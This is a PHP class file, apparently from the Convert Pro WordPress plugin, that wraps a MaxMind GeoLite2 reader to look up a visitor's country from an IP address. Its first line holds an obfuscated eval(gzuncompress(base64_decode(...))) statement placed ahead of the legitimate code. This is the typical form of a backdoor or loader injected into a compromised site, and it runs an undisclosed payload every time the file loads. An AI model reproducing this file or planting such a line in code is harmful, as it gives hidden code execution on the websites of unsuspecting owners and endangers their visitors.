<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Wrapper for MaxMind GeoLite2 Reader
 *
 * This class provide an interface to handle geolocation and error handling.
 *
 * Requires PHP 5.4+.
 *
 * @package Convert Pro\Classes
 * @since   3.4.0
 */

defined( 'ABSPATH' ) || exit;

/**
 * Geolite integration class.
 */
class CP_Geolite_Integration_Target {

	/**
	 * MaxMind GeoLite2 database path.
	 *
	 * @var string
	 */
	private $database = '';

	/**
	 * Logger instance.
	 *
	 * @var CP_Logger
	 */
	private $log = null;

	/**
	 * Constructor.
	 *
	 * @param string $database MaxMind GeoLite2 database path.
	 */
	public function __construct( $database ) {
		$this->database = $database;

		if ( ! class_exists( 'CPlus\\MaxMind\\Db\\Reader', false ) ) {
			$this->require_geolite_library();
		}
	}

	/**
	 * Get country 2-letters ISO by IP address.
	 * Retuns empty string when not able to find any ISO code.
	 *
	 * @param string $ip_address User IP address.
	 * @return string
	 */
	public function get_country_iso( $ip_address ) {
		$iso_code = '';
		$error = false;
		try {
			$reader   = new CPlus\MaxMind\Db\Reader( $this->database ); // phpcs:ignore PHPCompatibility.PHP.NewLanguageConstructs.t_ns_separatorFound
			$data     = $reader->get( $ip_address );
			$iso_code = $data['country']['iso_code'];

			$reader->close();
		} catch ( Exception $e ) {
			//error_log( 'CP Geo Warning: $e' );
			$error = true;
		}

		return sanitize_text_field( strtoupper( $iso_code ) );
	}

	/**
	 * Logging method.
	 *
	 * @param string $message Log message.
	 * @param string $level   Log level.
	 *                        Available options: 'emergency', 'alert',
	 *                        'critical', 'error', 'warning', 'notice',
	 *                        'info' and 'debug'.
	 *                        Defaults to 'info'.
	 */
	private function log( $message, $level = 'info' ) {
		$error = false;
		if ( !is_null( $this->log ) ) {
			$error = true;
			// Log in future if required.
			//error_log( 'CP Geo Warning: $e' );
		}

	}

	/**
	 * Require geolite library.
	 */
	private function require_geolite_library() {
		if ( version_compare( PHP_VERSION, '5.4.0', '>=' ) ) {
			require_once GEO_IP_BSF_DIR . 'includes/lib/geolite2/Reader/Decoder.php';
			require_once GEO_IP_BSF_DIR . 'includes/lib/geolite2/Reader/InvalidDatabaseException.php';
			require_once GEO_IP_BSF_DIR . 'includes/lib/geolite2/Reader/Metadata.php';
			require_once GEO_IP_BSF_DIR . 'includes/lib/geolite2/Reader/Util.php';
			require_once GEO_IP_BSF_DIR . 'includes/lib/geolite2/Reader.php';
		}
	}
}
